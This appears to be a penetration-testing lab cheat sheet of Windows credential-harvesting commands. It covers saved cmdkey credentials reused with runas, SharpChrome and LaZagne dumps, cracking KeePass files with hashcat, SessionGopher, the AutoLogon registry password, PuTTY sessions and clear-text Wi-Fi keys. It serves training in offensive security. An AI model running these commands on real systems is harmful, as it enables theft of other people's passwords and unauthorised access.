# Cmdkey Saved Credentials
```powershell
cmdkey /list
Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob

runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

# Browser Credential
```powershell
.\SharpChrome.exe logins /unprotect
```

# Password Managers
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx, *.opvault, *CyberArk* -Recurse -ErrorAction SilentlyContinue | Select-Object FullName

python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

# Email
```powershell
https://github.com/dafthack/MailSniper
```

# LaZagne
```powershell
.\lazagne.exe all
```

# SessionGopher
```powershell
https://github.com/Arvanaghi/SessionGopher

Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

# Windows AutoLogon
```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon, DefaultUserName, DefaultPassword

    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

# Putty
```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

# Wifi Password
```powershell
netsh wlan show profile

netsh wlan show profile <SSID_NAME> key=clear
```
